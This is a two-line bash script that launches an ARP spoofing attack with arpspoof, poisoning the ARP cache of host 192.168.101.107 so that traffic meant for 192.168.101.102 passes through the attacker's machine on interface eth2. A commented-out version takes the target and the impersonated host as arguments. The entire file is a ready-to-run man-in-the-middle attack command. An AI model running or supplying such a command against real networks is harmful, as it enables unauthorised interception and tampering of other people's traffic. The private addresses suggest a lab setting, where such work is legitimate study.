#! /bin/bash

sudo arpspoof -i eth2 -t 192.168.101.107 192.168.101.102

# sudo arpspoof -i eth2 -t "$1" "$2"

